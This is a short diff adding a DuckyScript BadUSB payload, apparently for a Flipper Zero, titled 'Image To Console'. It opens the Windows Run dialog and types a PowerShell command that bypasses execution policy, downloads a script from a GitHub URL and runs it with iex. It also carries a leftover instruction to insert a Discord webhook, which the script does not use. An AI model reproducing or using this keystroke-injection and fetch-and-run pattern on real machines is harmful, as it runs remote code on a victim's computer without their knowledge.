@@ -1,0 +1,18 @@
+REM Title: Image To Console
+REM Author: @beigeworm
+REM Description: Convert an image to Powershell console.
+REM Target: Windows 10
+
+REM Replace YOUR_WEBHOOK_HERE with your Discord webhook URL
+
+REM some setup for dukie script
+DEFAULT_DELAY 100
+
+REM open powershell (remove "-W H" to show the window)
+DELAY 1000
+GUI r
+DELAY 750
+STRING powershell -NoP -Ep Bypass -C irm https://raw.githubusercontent.com/beigeworm/BadUSB-Files-For-FlipperZero/main/Image-to-Console/main.ps1 | iex
+ENTER
+
+
